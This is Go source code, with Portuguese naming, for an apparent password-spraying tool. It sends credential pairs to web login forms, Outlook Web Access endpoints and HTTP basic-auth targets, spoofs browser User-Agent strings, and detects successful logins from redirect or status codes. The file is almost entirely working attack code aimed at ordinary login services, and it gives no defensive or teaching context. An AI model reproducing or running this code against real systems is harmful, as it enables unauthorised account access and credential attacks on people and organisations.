package main

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type config struct {
	alvo     string
	proto    string
	campoUsr string
	campoPwd string
	delay    time.Duration
	verboso  bool
}

type par struct {
	usuario string
	senha   string
}

type resultado struct {
	p      par
	ok     bool
	status int
	erro   error
}

var httpcli = &http.Client{
	Timeout: 10 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		// nao segue redirect — precisamos do 302 pra detectar sucesso
		return http.ErrUseLastResponse
	},
}

func tentar(cfg config, p par) resultado {
	if cfg.delay > 0 {
		time.Sleep(cfg.delay)
	}
	switch cfg.proto {
	case "owa":
		return sprayOWA(cfg, p)
	case "basico":
		return sprayBasico(cfg, p)
	default:
		return sprayForm(cfg, p)
	}
}

func sprayForm(cfg config, p par) resultado {
	corpo := url.Values{}
	corpo.Set(cfg.campoUsr, p.usuario)
	corpo.Set(cfg.campoPwd, p.senha)

	req, err := http.NewRequest("POST", cfg.alvo, strings.NewReader(corpo.Encode()))
	if err != nil {
		return resultado{p: p, erro: err}
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	resp, err := httpcli.Do(req)
	if err != nil {
		return resultado{p: p, erro: err}
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	// redirect pos-POST e o indicador mais comum de login bem-sucedido
	ok := resp.StatusCode == 302 || resp.StatusCode == 301
	return resultado{p: p, ok: ok, status: resp.StatusCode}
}

func sprayOWA(cfg config, p par) resultado {
	endpoint := strings.TrimRight(cfg.alvo, "/") + "/owa/auth.owa"

	corpo := url.Values{}
	corpo.Set("destination", strings.TrimRight(cfg.alvo, "/")+"/owa/")
	corpo.Set("flags", "4")
	corpo.Set("forcedownlevel", "0")
	corpo.Set("username", p.usuario)
	corpo.Set("password", p.senha)
	corpo.Set("passwordText", "")
	corpo.Set("isUtf8", "1")

	req, err := http.NewRequest("POST", endpoint, strings.NewReader(corpo.Encode()))
	if err != nil {
		return resultado{p: p, erro: err}
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	resp, err := httpcli.Do(req)
	if err != nil {
		return resultado{p: p, erro: err}
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	// OWA redireciona pra /owa/ em sucesso, pra logon.aspx em falha
	loc := resp.Header.Get("Location")
	ok := resp.StatusCode == 302 && !strings.Contains(loc, "logon")
	return resultado{p: p, ok: ok, status: resp.StatusCode}
}

func sprayBasico(cfg config, p par) resultado {
	req, err := http.NewRequest("GET", cfg.alvo, nil)
	if err != nil {
		return resultado{p: p, erro: err}
	}
	req.SetBasicAuth(p.usuario, p.senha)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	resp, err := httpcli.Do(req)
	if err != nil {
		return resultado{p: p, erro: err}
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	ok := resp.StatusCode == 200
	return resultado{p: p, ok: ok, status: resp.StatusCode}
}
